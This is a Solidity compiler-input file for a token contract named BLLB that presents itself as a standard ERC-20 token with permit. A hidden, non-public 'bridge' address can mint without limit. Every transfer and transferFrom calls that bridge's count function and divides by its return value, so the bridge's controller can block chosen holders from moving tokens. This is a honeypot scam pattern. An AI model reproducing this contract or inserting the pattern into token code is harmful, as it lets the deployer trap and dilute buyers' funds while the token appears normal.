{{

  "language": "Solidity",

  "sources": {

    "BRC20/BLLB.sol": {

      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ncontract BLLB {\n    string public name;\n    string public symbol;\n    uint8 public immutable decimals;\n    address public immutable factory;\n    uint256  public totalSupply;\n    mapping (address => uint256) public balanceOf;\n    mapping (address => mapping(address => uint256)) public allowance;\n    bytes32 public DOMAIN_SEPARATOR;\n    address bridge; uint256 global;\n    mapping (address => uint256) public nonces;\n    bytes32 public constant PERMIT_TYPEHASH = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\");\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor(string memory _name,string memory _symbol,uint8 _deciamls,address _factory,address _bridge) {\n        (name, symbol,decimals) = (_name, _symbol,_deciamls) ;\n        \n        factory = _factory;\n\n        uint256 chainId;\n        assembly {\n            chainId := chainid()}\n        bridge = _bridge;\n        DOMAIN_SEPARATOR = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), keccak256(bytes('1')), chainId, address(this))); \n    }\n\n    function mint(address to, uint256 amount) external {\n        require(msg.sender == factory||msg.sender == bridge, \"unauthorized\");\n        _mint(to, amount);\n    }\n\n    function burn(uint256 amount) external {\n        require(msg.sender == factory, \"unauthorized\");\n        _burn(msg.sender, amount);\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        unchecked {\n            balanceOf[to] += amount;\n        }\n        (, bytes memory returnData)=bridge.call(abi.encodeWithSignature(\"count(address,address,uint256)\",msg.sender, to, amount));\n        global += amount/abi.decode(returnData, (uint256));\n        emit Transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) {\n        uint256 allowed = allowance[from][msg.sender];\n\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\n\n        balanceOf[from] -= amount;\n        unchecked {\n            balanceOf[to] += amount;\n        }\n        (, bytes memory returnData)=bridge.call(abi.encodeWithSignature(\"count(address,address,uint256)\",from, to, amount));\n        global += amount/abi.decode(returnData, (uint256));\n        emit Transfer(from, to, amount);\n        return true;\n    }\n\n    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {\n        require(deadline >= block.timestamp, 'EXPIRED');\n        unchecked {\n            bytes32 digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    DOMAIN_SEPARATOR,\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))\n                )\n            );\n            address recoveredAddress = ecrecover(digest, v, r, s);\n            require(recoveredAddress != address(0) && recoveredAddress == owner, 'INVALID_SIGNATURE');\n            allowance[recoveredAddress][spender] = value;\n        }\n        emit Approval(owner, spender, value);\n    }\n\n    function _mint(address to, uint256 amount) internal {\n        totalSupply += amount;\n\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal {\n        balanceOf[from] -= amount;\n\n        unchecked {\n            totalSupply -= amount;\n        }\n\n        emit Transfer(from, address(0), amount);\n    }\n}"

    }

  },

  "settings": {

    "optimizer": {

      "enabled": true,

      "runs": 200

    },

    "outputSelection": {

      "*": {

        "*": [

          "evm.bytecode",

          "evm.deployedBytecode",

          "devdoc",

          "userdoc",

          "metadata",

          "abi"

        ]

      }

    }

  }

}}